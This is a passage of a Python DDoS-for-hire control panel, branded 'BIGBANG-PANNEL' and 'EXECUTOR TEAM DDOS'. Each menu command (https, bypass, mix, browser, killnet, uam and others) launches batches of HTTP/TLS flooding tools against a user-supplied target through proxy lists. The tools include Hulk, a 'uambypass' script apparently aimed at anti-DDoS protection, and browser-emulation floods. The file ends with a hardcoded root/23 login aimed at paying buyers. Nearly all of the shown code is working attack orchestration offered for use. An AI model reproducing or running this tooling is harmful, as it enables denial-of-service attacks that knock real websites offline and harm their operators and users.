				os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')	
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "https2" or sinput == "HTTPS2":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 500 2')
				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 500 5')
				os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 1 {time}')
				os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data GET')
				os.system(f'cd .godzilla && screen -dm node HTTP-RAND.js {host} {time}')
				os.system(f'cd .resources && screen -dm go run strike.go -url {host} GET')
				os.system(f'cd .resources && screen -dm go run Low.go -site {host} -data POST')
				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
				os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 500 2')
				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 500 5')
				os.system(f'cd /media && screen -dm node HTTP.js {host} 500 1 {time}')
				os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
				os.system(f'cd /media && screen -dm node HTTP-RAND.js {host} {time}')
				os.system(f'cd /media && screen -dm go run strike.go -url {host} POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS2 \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "bypass" or sinput == "BYPASS":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 100 GET proxy.txt 32')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mBYPASS \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "mix" or sinput == "MIX":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
				os.system(f'cd .SUDANC && screen -dm node OVER4.js {host} {time} 10 GET proxy.txt 64')
				os.system(f'cd .SUDAN && screen -dm node OVER2.js {host} {time} 10 proxy.txt 64 10')
				os.system(f'cd .SUDANC && screen -dm node OVER5.js {host} {time} 8 1 proxy.txt')
				os.system(f'cd .SUDAN && screen -dm node OVER3.js {host} {time} 10 32 proxy.txt --debug=false --ua=all --querystring=true')
				os.system(f'cd .SUDANC && screen -dm node OVER6.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd /media && screen -dm node OVER.js {host} 32 {time}')
				os.system(f'cd /media && screen -dm node OVER2.js {host} {time} 10 proxy.txt 32 10')
				os.system(f'cd /media && screen -dm node OVER3.js {host} {time} 10 32 proxy.txt --debug=false --ua=all --querystring=true')
				os.system(f'cd /media && screen -dm node OVER4.js {host} {time} 10 GET proxy.txt 32')
				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mMIX \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()			    
		elif sinput == "bot2" or sinput == "BOT2":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
				os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')	
				os.system(f'cd /media && screen -dm node OVER.js {host} 16 {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mBOT2 \033[35m]
\033[1;37m                LAYER-12 : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()			    
		elif sinput == "browser" or sinput == "BROWSER":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .BF && screen -dm ./BROWSER {host} {time} 64 10')
				os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
				os.system(f'cd .BF && screen -dm node BROWSER3.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd .BF2 && screen -dm node BROWSER4.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd .BF3 && screen -dm node BROWSER2.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd .BF3 && screen -dm node BROWSER5.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 40 3 500')	
				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 5 500')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
				os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd /media && screen -dm ./BROWSER {host} {time} 64 10')
				os.system(f'cd /media && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
				os.system(f'cd /media && screen -dm node BROWSER3.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd /media && screen -dm node BROWSER4.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd /media && screen -dm node BROWSER2.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd /media && screen -dm node BROWSER5.js {host} {time} 64 10 proxy.txt')	
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mBROWSER \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "killnet" or sinput == "KILLNET":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
				os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 5 500')
				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
				os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
				os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
				os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
				os.system(f'cd .randomstring && cd examples && screen -dm java input2.java {host} 8000')
				os.system(f'cd .malware && screen -dm node tlsv2.js {host} {time} 64 1')
				os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
				os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
				os.system(f'cd /media && screen -dm ./tls {host} {time} 64 3 500')
				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
				os.system(f'cd /media && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 64 1')
				os.system(f'cd /media && screen -dm node HTTP.js {host} 500 5 {time}')
				os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[1;37mKILLNET \033[35m]
\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()			    			    
		elif sinput == "uam" or sinput == "UAM":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
				os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7   : \033[35m[ \033[1;37mUAM \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
                

		
					
 
def login():
    os.system("clear")
    user = "root"
    passwd = "23"
    username = input("""





    
                
                           ⚡ \33[0;32mLOGIN TO BIGBANG-PANNEL : """)
    password = getpass.getpass(prompt="""                  
                           ⚡ \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""        
                              ☠️ \033[1;31;40mBUY YA SAYANG!!!🚫""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                         ⚡ \33[0;32mWELLCOME TO EXECUTOR TEAM DDOS""")
        time.sleep(0.3)
    menu()
    main()
    

login()